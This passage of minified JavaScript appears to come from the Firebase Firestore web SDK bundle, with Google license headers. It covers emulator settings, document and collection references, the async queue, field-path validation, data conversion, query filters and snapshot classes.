gS(e),this._emulatorOptions=e.emulatorOptions||{},e.credentials!==void 0&&(this._authCredentials=function(r){if(!r)return new tV;switch(r.type){case"firstParty":return new sV(r.sessionIndex||"0",r.iamToken||null,r.authTokenFactory||null);case"provider":return r.client;default:throw new we(ie.INVALID_ARGUMENT,"makeAuthCredentialsProvider failed due to invalid credential type")}}(e.credentials))}_getSettings(){return this._settings}_getEmulatorOptions(){return this._emulatorOptions}_freezeSettings(){return this._settingsFrozen=!0,this._settings}_delete(){return this._terminateTask==="notTerminated"&&(this._terminateTask=this._terminate()),this._terminateTask}async _restart(){this._terminateTask==="notTerminated"?await this._terminate():this._terminateTask="notTerminated"}toJSON(){return{app:this._app,databaseId:this._databaseId,settings:this._settings}}_terminate(){return function(t){const r=hS.get(t);r&&(me("ComponentProvider","Removing Datastore"),hS.delete(t),r.terminate())}(this),Promise.resolve()}}function Kz(n,e,t,r={}){var i;const s=(n=Ri(n,Xp))._getSettings(),o=Object.assign(Object.assign({},s),{emulatorOptions:n._getEmulatorOptions()}),a=`${e}:${t}`;s.host!==lC&&s.host!==a&&Bl("Host has been set in both settings() and connectFirestoreEmulator(), emulator host will be used.");const l=Object.assign(Object.assign({},s),{host:a,ssl:!1,emulatorOptions:r});if(!ia(l,o)&&(n._setSettings(l),r.mockUserToken)){let u,h;if(typeof r.mockUserToken=="string")u=r.mockUserToken,h=Zn.MOCK_USER;else{u=u5(r.mockUserToken,(i=n._app)===null||i===void 0?void 0:i.options.projectId);const f=r.mockUserToken.sub||r.mockUserToken.user_id;if(!f)throw new we(ie.INVALID_ARGUMENT,"mockUserToken must contain 'sub' or 'user_id' field!");h=new Zn(f)}n._authCredentials=new nV(new $2(u,h))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ac{constructor(e,t,r){this.converter=t,this._query=r,this.type="query",this.firestore=e}withConverter(e){return new ac(this.firestore,e,this._query)}}class or{constructor(e,t,r){this.converter=t,this._key=r,this.type="document",this.firestore=e}get _path(){return this._key.path}get id(){return this._key.path.lastSegment()}get path(){return this._key.path.canonicalString()}get parent(){return new so(this.firestore,this.converter,this._key.path.popLast())}withConverter(e){return new or(this.firestore,e,this._key)}}class so extends ac{constructor(e,t,r){super(e,t,xv(r)),this._path=r,this.type="collection"}get id(){return this._query.path.lastSegment()}get path(){return this._query.path.canonicalString()}get parent(){const e=this._path.popLast();return e.isEmpty()?null:new or(this.firestore,null,new Se(e))}withConverter(e){return new so(this.firestore,e,this._path)}}function Gu(n,e,...t){if(n=bn(n),aC("collection","path",e),n instanceof Xp){const r=Mt.fromString(e,...t);return dS(r),new so(n,null,r)}{if(!(n instanceof or||n instanceof so))throw new we(ie.INVALID_ARGUMENT,"Expected first argument to collection() to be a CollectionReference, a DocumentReference or FirebaseFirestore");const r=n._path.child(Mt.fromString(e,...t));return dS(r),new so(n.firestore,null,r)}}function Hv(n,e,...t){if(n=bn(n),arguments.length===1&&(e=q2.newId()),aC("doc","path",e),n instanceof Xp){const r=Mt.fromString(e,...t);return fS(r),new or(n,null,new Se(r))}{if(!(n instanceof or||n instanceof so))throw new we(ie.INVALID_ARGUMENT,"Expected first argument to collection() to be a CollectionReference, a DocumentReference or FirebaseFirestore");const r=n._path.child(Mt.fromString(e,...t));return fS(r),new or(n.firestore,n instanceof so?n.converter:null,new Se(r))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const mS="AsyncQueue";class yS{constructor(e=Promise.resolve()){this.Vu=[],this.mu=!1,this.fu=[],this.gu=null,this.pu=!1,this.yu=!1,this.wu=[],this.a_=new Uk(this,"async_queue_retry"),this.Su=()=>{const r=km();r&&me(mS,"Visibility state changed to "+r.visibilityState),this.a_.t_()},this.bu=e;const t=km();t&&typeof t.addEventListener=="function"&&t.addEventListener("visibilitychange",this.Su)}get isShuttingDown(){return this.mu}enqueueAndForget(e){this.enqueue(e)}enqueueAndForgetEvenWhileRestricted(e){this.Du(),this.vu(e)}enterRestrictedMode(e){if(!this.mu){this.mu=!0,this.yu=e||!1;const t=km();t&&typeof t.removeEventListener=="function"&&t.removeEventListener("visibilitychange",this.Su)}}enqueue(e){if(this.Du(),this.mu)return new Promise(()=>{});const t=new ns;return this.vu(()=>this.mu&&this.yu?Promise.resolve():(e().then(t.resolve,t.reject),t.promise)).then(()=>t.promise)}enqueueRetryable(e){this.enqueueAndForget(()=>(this.Vu.push(e),this.Cu()))}async Cu(){if(this.Vu.length!==0){try{await this.Vu[0](),this.Vu.shift(),this.a_.reset()}catch(e){if(!sc(e))throw e;me(mS,"Operation failed with retryable error: "+e)}this.Vu.length>0&&this.a_.Xo(()=>this.Cu())}}vu(e){const t=this.bu.then(()=>(this.pu=!0,e().catch(r=>{this.gu=r,this.pu=!1;const i=function(o){let a=o.message||"";return o.stack&&(a=o.stack.includes(o.message)?o.stack:o.message+`
`+o.stack),a}(r);throw fs("INTERNAL UNHANDLED ERROR: ",i),r}).then(r=>(this.pu=!1,r))));return this.bu=t,t}enqueueAfterDelay(e,t,r){this.Du(),this.wu.indexOf(e)>-1&&(t=0);const i=Vv.createAndSchedule(this,e,t,r,s=>this.Fu(s));return this.fu.push(i),i}Du(){this.gu&&Me()}verifyOperationInProgress(){}async Mu(){let e;do e=this.bu,await e;while(e!==this.bu)}xu(e){for(const t of this.fu)if(t.timerId===e)return!0;return!1}Ou(e){return this.Mu().then(()=>{this.fu.sort((t,r)=>t.targetTimeMs-r.targetTimeMs);for(const t of this.fu)if(t.skipDelay(),e!=="all"&&t.timerId===e)break;return this.Mu()})}Nu(e){this.wu.push(e)}Fu(e){const t=this.fu.indexOf(e);this.fu.splice(t,1)}}class lc extends Xp{constructor(e,t,r,i){super(e,t,r,i),this.type="firestore",this._queue=new yS,this._persistenceKey=(i==null?void 0:i.name)||"[DEFAULT]"}async _terminate(){if(this._firestoreClient){const e=this._firestoreClient.terminate();this._queue=new yS(e),this._firestoreClient=void 0,await e}}}function cC(n,e){const t=typeof n=="object"?n:t2(),r=typeof n=="string"?n:e||Dd,i=hv(t,"firestore").getImmediate({identifier:r});if(!i._initialized){const s=l5("firestore");s&&Kz(i,...s)}return i}function qv(n){if(n._terminated)throw new we(ie.FAILED_PRECONDITION,"The client has already been terminated.");return n._firestoreClient||Gz(n),n._firestoreClient}function Gz(n){var e,t,r;const i=n._freezeSettings(),s=function(a,l,u,h){return new _V(a,l,u,h.host,h.ssl,h.experimentalForceLongPolling,h.experimentalAutoDetectLongPolling,oC(h.experimentalLongPollingOptions),h.useFetchStreams)}(n._databaseId,((e=n._app)===null||e===void 0?void 0:e.options.appId)||"",n._persistenceKey,i);n._componentsProvider||!((t=i.localCache)===null||t===void 0)&&t._offlineComponentProvider&&(!((r=i.localCache)===null||r===void 0)&&r._onlineComponentProvider)&&(n._componentsProvider={_offline:i.localCache._offlineComponentProvider,_online:i.localCache._onlineComponentProvider}),n._firestoreClient=new Fz(n._authCredentials,n._appCheckCredentials,n._queue,s,n._componentsProvider&&function(a){const l=a==null?void 0:a._online.build();return{_offline:a==null?void 0:a._offline.build(l),_online:l}}(n._componentsProvider))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Wl{constructor(e){this._byteString=e}static fromBase64String(e){try{return new Wl(Vn.fromBase64String(e))}catch(t){throw new we(ie.INVALID_ARGUMENT,"Failed to construct data from Base64 string: "+t)}}static fromUint8Array(e){return new Wl(Vn.fromUint8Array(e))}toBase64(){return this._byteString.toBase64()}toUint8Array(){return this._byteString.toUint8Array()}toString(){return"Bytes(base64: "+this.toBase64()+")"}isEqual(e){return this._byteString.isEqual(e._byteString)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class eg{constructor(...e){for(let t=0;t<e.length;++t)if(e[t].length===0)throw new we(ie.INVALID_ARGUMENT,"Invalid field name at argument $(i + 1). Field names must not be empty.");this._internalPath=new Bn(e)}isEqual(e){return this._internalPath.isEqual(e._internalPath)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Kv{constructor(e){this._methodName=e}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Gv{constructor(e,t){if(!isFinite(e)||e<-90||e>90)throw new we(ie.INVALID_ARGUMENT,"Latitude must be a number between -90 and 90, but was: "+e);if(!isFinite(t)||t<-180||t>180)throw new we(ie.INVALID_ARGUMENT,"Longitude must be a number between -180 and 180, but was: "+t);this._lat=e,this._long=t}get latitude(){return this._lat}get longitude(){return this._long}isEqual(e){return this._lat===e._lat&&this._long===e._long}toJSON(){return{latitude:this._lat,longitude:this._long}}_compareTo(e){return $e(this._lat,e._lat)||$e(this._long,e._long)}}/**
 * @license
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Qv{constructor(e){this._values=(e||[]).map(t=>t)}toArray(){return this._values.map(e=>e)}isEqual(e){return function(r,i){if(r.length!==i.length)return!1;for(let s=0;s<r.length;++s)if(r[s]!==i[s])return!1;return!0}(this._values,e._values)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Qz=/^__.*__$/;class Yz{constructor(e,t,r){this.data=e,this.fieldMask=t,this.fieldTransforms=r}toMutation(e,t){return this.fieldMask!==null?new Eo(e,this.data,this.fieldMask,t,this.fieldTransforms):new ph(e,this.data,t,this.fieldTransforms)}}class uC{constructor(e,t,r){this.data=e,this.fieldMask=t,this.fieldTransforms=r}toMutation(e,t){return new Eo(e,this.data,this.fieldMask,t,this.fieldTransforms)}}function hC(n){switch(n){case 0:case 2:case 1:return!0;case 3:case 4:return!1;default:throw Me()}}class Yv{constructor(e,t,r,i,s,o){this.settings=e,this.databaseId=t,this.serializer=r,this.ignoreUndefinedProperties=i,s===void 0&&this.Bu(),this.fieldTransforms=s||[],this.fieldMask=o||[]}get path(){return this.settings.path}get Lu(){return this.settings.Lu}ku(e){return new Yv(Object.assign(Object.assign({},this.settings),e),this.databaseId,this.serializer,this.ignoreUndefinedProperties,this.fieldTransforms,this.fieldMask)}qu(e){var t;const r=(t=this.path)===null||t===void 0?void 0:t.child(e),i=this.ku({path:r,Qu:!1});return i.$u(e),i}Uu(e){var t;const r=(t=this.path)===null||t===void 0?void 0:t.child(e),i=this.ku({path:r,Qu:!1});return i.Bu(),i}Ku(e){return this.ku({path:void 0,Qu:!0})}Wu(e){return Hd(e,this.settings.methodName,this.settings.Gu||!1,this.path,this.settings.zu)}contains(e){return this.fieldMask.find(t=>e.isPrefixOf(t))!==void 0||this.fieldTransforms.find(t=>e.isPrefixOf(t.field))!==void 0}Bu(){if(this.path)for(let e=0;e<this.path.length;e++)this.$u(this.path.get(e))}$u(e){if(e.length===0)throw this.Wu("Document fields must not be empty");if(hC(this.Lu)&&Qz.test(e))throw this.Wu('Document fields cannot begin and end with "__"')}}class Zz{constructor(e,t,r){this.databaseId=e,this.ignoreUndefinedProperties=t,this.serializer=r||Qp(e)}ju(e,t,r,i=!1){return new Yv({Lu:e,methodName:t,zu:r,path:Bn.emptyPath(),Qu:!1,Gu:i},this.databaseId,this.serializer,this.ignoreUndefinedProperties)}}function tg(n){const e=n._freezeSettings(),t=Qp(n._databaseId);return new Zz(n._databaseId,!!e.ignoreUndefinedProperties,t)}function fC(n,e,t,r,i,s={}){const o=n.ju(s.merge||s.mergeFields?2:0,e,t,i);Zv("Data must be an object, but it was:",o,r);const a=dC(r,o);let l,u;if(s.merge)l=new Cr(o.fieldMask),u=o.fieldTransforms;else if(s.mergeFields){const h=[];for(const f of s.mergeFields){const m=Cy(e,f,t);if(!o.contains(m))throw new we(ie.INVALID_ARGUMENT,`Field '${m}' is specified in your field mask but missing from your input data.`);gC(h,m)||h.push(m)}l=new Cr(h),u=o.fieldTransforms.filter(f=>l.covers(f.field))}else l=null,u=o.fieldTransforms;return new Yz(new gr(a),l,u)}class ng extends Kv{_toFieldTransform(e){if(e.Lu!==2)throw e.Lu===1?e.Wu(`${this._methodName}() can only appear at the top level of your update data`):e.Wu(`${this._methodName}() cannot be used with set() unless you pass {merge:true}`);return e.fieldMask.push(e.path),null}isEqual(e){return e instanceof ng}}function Jz(n,e,t,r){const i=n.ju(1,e,t);Zv("Data must be an object, but it was:",i,r);const s=[],o=gr.empty();_o(r,(l,u)=>{const h=Jv(e,l,t);u=bn(u);const f=i.Uu(h);if(u instanceof ng)s.push(h);else{const m=wh(u,f);m!=null&&(s.push(h),o.set(h,m))}});const a=new Cr(s);return new uC(o,a,i.fieldTransforms)}function Xz(n,e,t,r,i,s){const o=n.ju(1,e,t),a=[Cy(e,r,t)],l=[i];if(s.length%2!=0)throw new we(ie.INVALID_ARGUMENT,`Function ${e}() needs to be called with an even number of arguments that alternate between field names and values.`);for(let m=0;m<s.length;m+=2)a.push(Cy(e,s[m])),l.push(s[m+1]);const u=[],h=gr.empty();for(let m=a.length-1;m>=0;--m)if(!gC(u,a[m])){const v=a[m];let x=l[m];x=bn(x);const k=o.Uu(v);if(x instanceof ng)u.push(v);else{const I=wh(x,k);I!=null&&(u.push(v),h.set(v,I))}}const f=new Cr(u);return new uC(h,f,o.fieldTransforms)}function e9(n,e,t,r=!1){return wh(t,n.ju(r?4:3,e))}function wh(n,e){if(pC(n=bn(n)))return Zv("Unsupported field value:",e,n),dC(n,e);if(n instanceof Kv)return function(r,i){if(!hC(i.Lu))throw i.Wu(`${r._methodName}() can only be used with update() and set()`);if(!i.path)throw i.Wu(`${r._methodName}() is not currently supported inside arrays`);const s=r._toFieldTransform(i);s&&i.fieldTransforms.push(s)}(n,e),null;if(n===void 0&&e.ignoreUndefinedProperties)return null;if(e.path&&e.fieldMask.push(e.path),n instanceof Array){if(e.settings.Qu&&e.Lu!==4)throw e.Wu("Nested arrays are not supported");return function(r,i){const s=[];let o=0;for(const a of r){let l=wh(a,i.Ku(o));l==null&&(l={nullValue:"NULL_VALUE"}),s.push(l),o++}return{arrayValue:{values:s}}}(n,e)}return function(r,i){if((r=bn(r))===null)return{nullValue:"NULL_VALUE"};if(typeof r=="number")return zV(i.serializer,r);if(typeof r=="boolean")return{booleanValue:r};if(typeof r=="string")return{stringValue:r};if(r instanceof Date){const s=mn.fromDate(r);return{timestampValue:Fd(i.serializer,s)}}if(r instanceof mn){const s=new mn(r.seconds,1e3*Math.floor(r.nanoseconds/1e3));return{timestampValue:Fd(i.serializer,s)}}if(r instanceof Gv)return{geoPointValue:{latitude:r.latitude,longitude:r.longitude}};if(r instanceof Wl)return{bytesValue:xk(i.serializer,r._byteString)};if(r instanceof or){const s=i.databaseId,o=r.firestore._databaseId;if(!o.isEqual(s))throw i.Wu(`Document reference is for database ${o.projectId}/${o.database} but should be for database ${s.projectId}/${s.database}`);return{referenceValue:Mv(r.firestore._databaseId||i.databaseId,r._key.path)}}if(r instanceof Qv)return function(o,a){return{mapValue:{fields:{[ek]:{stringValue:nk},[Od]:{arrayValue:{values:o.toArray().map(u=>{if(typeof u!="number")throw a.Wu("VectorValues must only contain numeric values.");return kv(a.serializer,u)})}}}}}}(r,i);throw i.Wu(`Unsupported field value: ${Jp(r)}`)}(n,e)}function dC(n,e){const t={};return G2(n)?e.path&&e.path.length>0&&e.fieldMask.push(e.path):_o(n,(r,i)=>{const s=wh(i,e.qu(r));s!=null&&(t[r]=s)}),{mapValue:{fields:t}}}function pC(n){return!(typeof n!="object"||n===null||n instanceof Array||n instanceof Date||n instanceof mn||n instanceof Gv||n instanceof Wl||n instanceof or||n instanceof Kv||n instanceof Qv)}function Zv(n,e,t){if(!pC(t)||!function(i){return typeof i=="object"&&i!==null&&(Object.getPrototypeOf(i)===Object.prototype||Object.getPrototypeOf(i)===null)}(t)){const r=Jp(t);throw r==="an object"?e.Wu(n+" a custom object"):e.Wu(n+" "+r)}}function Cy(n,e,t){if((e=bn(e))instanceof eg)return e._internalPath;if(typeof e=="string")return Jv(n,e);throw Hd("Field path arguments must be of type string or ",n,!1,void 0,t)}const t9=new RegExp("[~\\*/\\[\\]]");function Jv(n,e,t){if(e.search(t9)>=0)throw Hd(`Invalid field path (${e}). Paths must not contain '~', '*', '/', '[', or ']'`,n,!1,void 0,t);try{return new eg(...e.split("."))._internalPath}catch{throw Hd(`Invalid field path (${e}). Paths must not be empty, begin with '.', end with '.', or contain '..'`,n,!1,void 0,t)}}function Hd(n,e,t,r,i){const s=r&&!r.isEmpty(),o=i!==void 0;let a=`Function ${e}() called with invalid data`;t&&(a+=" (via `toFirestore()`)"),a+=". ";let l="";return(s||o)&&(l+=" (found",s&&(l+=` in field ${r}`),o&&(l+=` in document ${i}`),l+=")"),new we(ie.INVALID_ARGUMENT,a+n+l)}function gC(n,e){return n.some(t=>t.isEqual(e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class mC{constructor(e,t,r,i,s){this._firestore=e,this._userDataWriter=t,this._key=r,this._document=i,this._converter=s}get id(){return this._key.path.lastSegment()}get ref(){return new or(this._firestore,this._converter,this._key)}exists(){return this._document!==null}data(){if(this._document){if(this._converter){const e=new n9(this._firestore,this._userDataWriter,this._key,this._document,null);return this._converter.fromFirestore(e)}return this._userDataWriter.convertValue(this._document.data.value)}}get(e){if(this._document){const t=this._document.data.field(Xv("DocumentSnapshot.get",e));if(t!==null)return this._userDataWriter.convertValue(t)}}}class n9 extends mC{data(){return super.data()}}function Xv(n,e){return typeof e=="string"?Jv(n,e):e instanceof eg?e._internalPath:e._delegate._internalPath}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function r9(n){if(n.limitType==="L"&&n.explicitOrderBy.length===0)throw new we(ie.UNIMPLEMENTED,"limitToLast() queries require specifying at least one orderBy() clause")}class e_{}class i9 extends e_{}function s9(n,e,...t){let r=[];e instanceof e_&&r.push(e),r=r.concat(t),function(s){const o=s.filter(l=>l instanceof t_).length,a=s.filter(l=>l instanceof rg).length;if(o>1||o>0&&a>0)throw new we(ie.INVALID_ARGUMENT,"InvalidQuery. When using composite filters, you cannot use more than one filter at the top level. Consider nesting the multiple filters within an `and(...)` statement. For example: change `query(query, where(...), or(...))` to `query(query, and(where(...), or(...)))`.")}(r);for(const i of r)n=i._apply(n);return n}class rg extends i9{constructor(e,t,r){super(),this._field=e,this._op=t,this._value=r,this.type="where"}static _create(e,t,r){return new rg(e,t,r)}_apply(e){const t=this._parse(e);return yC(e._query,t),new ac(e.firestore,e.converter,wy(e._query,t))}_parse(e){const t=tg(e.firestore);return function(s,o,a,l,u,h,f){let m;if(u.isKeyField()){if(h==="array-contains"||h==="array-contains-any")throw new we(ie.INVALID_ARGUMENT,`Invalid Query. You can't perform '${h}' queries on documentId().`);if(h==="in"||h==="not-in"){vS(f,h);const x=[];for(const k of f)x.push(wS(l,s,k));m={arrayValue:{values:x}}}else m=wS(l,s,f)}else h!=="in"&&h!=="not-in"&&h!=="array-contains-any"||vS(f,h),m=e9(a,o,f,h==="in"||h==="not-in");return fn.create(u,h,m)}(e._query,"where",t,e.firestore._databaseId,this._field,this._op,this._value)}}function o9(n,e,t){const r=e,i=Xv("where",n);return rg._create(i,r,t)}class t_ extends e_{constructor(e,t){super(),this.type=e,this._queryConstraints=t}static _create(e,t){return new t_(e,t)}_parse(e){const t=this._queryConstraints.map(r=>r._parse(e)).filter(r=>r.getFilters().length>0);return t.length===1?t[0]:gi.create(t,this._getOperator())}_apply(e){const t=this._parse(e);return t.getFilters().length===0?e:(function(i,s){let o=i;const a=s.getFlattenedFilters();for(const l of a)yC(o,l),o=wy(o,l)}(e._query,t),new ac(e.firestore,e.converter,wy(e._query,t)))}_getQueryConstraints(){return this._queryConstraints}_getOperator(){return this.type==="and"?"and":"or"}}function wS(n,e,t){if(typeof(t=bn(t))=="string"){if(t==="")throw new we(ie.INVALID_ARGUMENT,"Invalid query. When querying with documentId(), you must provide a valid document ID, but it was an empty string.");if(!uk(e)&&t.indexOf("/")!==-1)throw new we(ie.INVALID_ARGUMENT,`Invalid query. When querying a collection by documentId(), you must provide a plain document ID, but '${t}' contains a '/' character.`);const r=e.path.child(Mt.fromString(t));if(!Se.isDocumentKey(r))throw new we(ie.INVALID_ARGUMENT,`Invalid query. When querying a collection group by documentId(), the value provided must result in a valid document path, but '${r}' is not because it has an odd number of segments (${r.length}).`);return LI(n,new Se(r))}if(t instanceof or)return LI(n,t._key);throw new we(ie.INVALID_ARGUMENT,`Invalid query. When querying with documentId(), you must provide a valid string or a DocumentReference, but it was: ${Jp(t)}.`)}function vS(n,e){if(!Array.isArray(n)||n.length===0)throw new we(ie.INVALID_ARGUMENT,`Invalid Query. A non-empty array is required for '${e.toString()}' filters.`)}function yC(n,e){const t=function(i,s){for(const o of i)for(const a of o.getFlattenedFilters())if(s.indexOf(a.op)>=0)return a.op;return null}(n.filters,function(i){switch(i){case"!=":return["!=","not-in"];case"array-contains-any":case"in":return["not-in"];case"not-in":return["array-contains-any","in","not-in","!="];default:return[]}}(e.op));if(t!==null)throw t===e.op?new we(ie.INVALID_ARGUMENT,`Invalid query. You cannot use more than one '${e.op.toString()}' filter.`):new we(ie.INVALID_ARGUMENT,`Invalid query. You cannot use '${e.op.toString()}' filters with '${t.toString()}' filters.`)}class a9{convertValue(e,t="none"){switch(ho(e)){case 0:return null;case 1:return e.booleanValue;case 2:return nn(e.integerValue||e.doubleValue);case 3:return this.convertTimestamp(e.timestampValue);case 4:return this.convertServerTimestamp(e,t);case 5:return e.stringValue;case 6:return this.convertBytes(uo(e.bytesValue));case 7:return this.convertReference(e.referenceValue);case 8:return this.convertGeoPoint(e.geoPointValue);case 9:return this.convertArray(e.arrayValue,t);case 11:return this.convertObject(e.mapValue,t);case 10:return this.convertVectorValue(e.mapValue);default:throw Me()}}convertObject(e,t){return this.convertObjectMap(e.fields,t)}convertObjectMap(e,t="none"){const r={};return _o(e,(i,s)=>{r[i]=this.convertValue(s,t)}),r}convertVectorValue(e){var t,r,i;const s=(i=(r=(t=e.fields)===null||t===void 0?void 0:t[Od].arrayValue)===null||r===void 0?void 0:r.values)===null||i===void 0?void 0:i.map(o=>nn(o.doubleValue));return new Qv(s)}convertGeoPoint(e){return new Gv(nn(e.latitude),nn(e.longitude))}convertArray(e,t){return(e.values||[]).map(r=>this.convertValue(r,t))}convertServerTimestamp(e,t){switch(t){case"previous":const r=Wp(e);return r==null?null:this.convertValue(r,t);case"estimate":return this.convertTimestamp(Wu(e));default:return null}}convertTimestamp(e){const t=co(e);return new mn(t.seconds,t.nanos)}convertDocumentKey(e,t){const r=Mt.fromString(e);st(Pk(r));const i=new $u(r.get(1),r.get(3)),s=new Se(r.popFirst(5));return i.isEqual(t)||fs(`Document ${s} contains a document reference within a different database (${i.projectId}/${i.database}) which is not supported. It will be treated as a reference in the current database (${t.projectId}/${t.database}) instead.`),s}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function wC(n,e,t){let r;return r=n?t&&(t.merge||t.mergeFields)?n.toFirestore(e,t):n.toFirestore(e):e,r}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Hc{constructor(e,t){this.hasPendingWrites=e,this.fromCache=t}isEqual(e){return this.hasPendingWrites===e.hasPendingWrites&&this.fromCache===e.fromCache}}class vC extends mC{constructor(e,t,r,i,s,o){super(e,t,r,i,o),this._firestore=e,this._firestoreImpl=e,this.metadata=s}exists(){return super.exists()}data(e={}){if(this._document){if(this._converter){const t=new jf(this._firestore,this._userDataWriter,this._key,this._document,this.metadata,null);return this._converter.fromFirestore(t,e)}return this._userDataWriter.convertValue(this._document.data.value,e.serverTimestamps)}}get(e,t={}){if(this._document){const r=this._document.data.field(Xv("DocumentSnapshot.get",e));if(r!==null)return this._userDataWriter.convertValue(r,t.serverTimestamps)}}}class jf extends vC{data(e={}){return super.data(e)}}class l9{constructor(e,t,r,i){this._firestore=e,this._userDataWriter=t,this._snapshot=i,this.metadata=new Hc(i.hasPendingWrites,i.fromCache),this.query=r}get docs(){const e=[];return this.forEach(t=>e.push(t)),e}get size(){return this._snapshot.docs.size}get empty(){return this.size===0}forEach(e,t){this._snapshot.docs.forEach(r=>{e.call(t,new jf(this._firestore,this._userDataWriter,r.key,r,new Hc(this._snapshot.mutatedKeys.has(r.key),this._snapshot.fromCache),this.query.converter))})}docChanges(e={}){const t=!!e.includeMetadataChanges;if(t&&this._snapshot.excludesMetadataChanges)throw new we(ie.INVALID_ARGUMENT,"To include metadata changes with your document changes, you must also pass { includeMetadataChanges:true } to onSnapshot().");return this._cachedChanges&&this._cachedChangesIncludeMetadataChanges===t||(this._cachedChanges=function(i,s){if(i._snapshot.oldDocs.isEmpty()){let o=0;return i._snapshot.docChanges.map(a=>{const l=new jf(i._firestore,i._userDataWriter,a.doc.key,a.doc,new Hc(i._snapshot.mutatedKeys.has(a.doc.key),i._snapshot.fromCache),i.query.converter);return a.doc,{type:"added",doc:l,oldIndex:-1,newIndex:o++}})}{let o=i._snapshot.oldDocs;return i._snapshot.docChanges.filter(a=>s||a.type!==3).map(a=>{const l=new jf(i._firestore,i._userDataWriter,a.doc.key,a.doc,new 